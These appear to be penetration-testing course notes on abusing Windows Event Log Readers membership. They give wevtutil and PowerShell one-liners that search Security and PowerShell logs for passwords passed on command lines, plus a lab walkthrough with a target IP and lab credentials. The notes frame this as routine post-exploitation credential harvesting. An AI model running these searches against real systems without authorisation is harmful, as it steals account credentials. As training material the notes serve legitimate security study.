# Section 11 — Event Log Readers

> **Lab: yes** — new target IP. Search security event logs for credentials passed via command line.

**Core principle:** When process creation auditing is enabled (Event ID 4688), Windows logs the full command line of every process started. If users/admins pass passwords as command-line arguments (e.g., `net use /user:X password`), those credentials are stored in the Security event log. Members of the `Event Log Readers` group can read these logs.

---

## Why credentials end up in event logs

| Command pattern | What gets logged |
|----------------|-----------------|
| `net use \\share /user:X password` | Plaintext password in process command line |
| `runas /user:X` | May log password in some configs |
| `psexec \\host -u X -p password` | Plaintext password |
| Scripts with hardcoded creds | Full script command line |
| `sqlcmd -U sa -P password` | Database credentials |

> Defenders enable this for visibility. Attackers harvest it for credentials.

---

## Exploitation methods

### Method 1: wevtutil (works for Event Log Readers members)

```cmd
wevtutil qe Security /rd:true /f:text | findstr "/user"
```
> `/rd:true` = read direction newest first. `/f:text` = human-readable format. Pipe to `findstr` to search for credential patterns.

**Search for other patterns:**
```cmd
wevtutil qe Security /rd:true /f:text | findstr /i "password pass pwd"
wevtutil qe Security /rd:true /f:text | findstr /i "/p "
```

**Remote log query (with creds):**
```cmd
wevtutil qe Security /rd:true /f:text /r:<REMOTE_HOST> /u:<USER> /p:<PASS> | findstr "/user"
```

### Method 2: Get-WinEvent (requires admin OR registry permission tweak)

```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

> **Important:** `Get-WinEvent` on the Security log requires admin access or specific registry permissions (`HKLM\System\CurrentControlSet\Services\Eventlog\Security`). Plain Event Log Readers membership is NOT sufficient for this cmdlet. Use `wevtutil` instead.

### Method 3: PowerShell Operational log (accessible to unprivileged users)

```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | where { $_.Message -like "*password*" -or $_.Message -like "*/user*" } | Select-Object TimeCreated, Message | fl
```
> Script block logging captures full PowerShell scripts — may contain creds even without Event Log Readers membership.

---

## Useful search terms

```cmd
:: In wevtutil output, search for:
/user           - net use with credentials
-p              - tools that take -p for password
password        - generic
-Password       - PowerShell parameter
ConvertTo-SecureString   - PowerShell credential creation
credential      - generic
```

---

## Lab walkthrough

**Target:** `10.129.101.186` (ACADEMY-WINLPE-SRV01) — **NEW IP!**
**Creds:** `logger` / `HTB_@cademy_stdnt!`
**Goal:** Find password for user `mary`

### Commands to run:

```cmd
:: Confirm group membership
net localgroup "Event Log Readers"
whoami /groups

:: Search for credentials in security logs
wevtutil qe Security /rd:true /f:text | findstr /i "/user"
```

**If that's too slow or too much output, narrow it down:**
```cmd
wevtutil qe Security /rd:true /f:text | findstr /i "mary"
```

**Or search for net use commands specifically:**
```cmd
wevtutil qe Security /rd:true /f:text | findstr /i "net use"
```

---

## Lab observations & attack chain

```
Event Log Readers membership (logger)
│
├── Search security event logs for Event ID 4688 (process creation)
│   └── Look for command lines containing credentials
│       ├── net use /user:mary <password>
│       ├── runas /user:mary
│       └── Any script/tool passing mary's password as argument
│
├── With mary's credentials:
│   ├── Check mary's group memberships (local admin? Backup Operators?)
│   ├── RDP/WinRM as mary → different privilege set
│   ├── Try password reuse against other hosts
│   └── Access resources mary has permissions to
│
└── Broader attack implications:
    ├── Process command line logging captures ALL users' commands
    │   └── Admin credentials, service account passwords, API keys
    ├── Historical data — may find creds from months ago
    └── Can query remote hosts' logs too (with valid creds + permissions)
```

**Real engagement note:** Event logs are a goldmine in environments with process auditing enabled. After getting any domain user access, always check if you're in Event Log Readers, and always search PowerShell Operational logs (accessible to all users). Many organizations log everything but don't restrict who can read the logs.

---

## Key takeaways

- **`wevtutil` is the go-to for Event Log Readers.** Get-WinEvent requires more permissions.
- **Search for `/user`, `password`, `-p` patterns.** Admins passing creds via command line is extremely common.
- **PowerShell Operational logs don't require special group membership.** Check them on every box.
- **Event logs persist.** You may find credentials from weeks/months ago that are still valid.
- **This is a low-noise attack.** Reading logs generates minimal suspicious activity compared to running exploits.
- **On real engagements, this is free intel.** Even if you're not in the group, once you escalate to admin, searching event logs is a standard post-exploitation step.
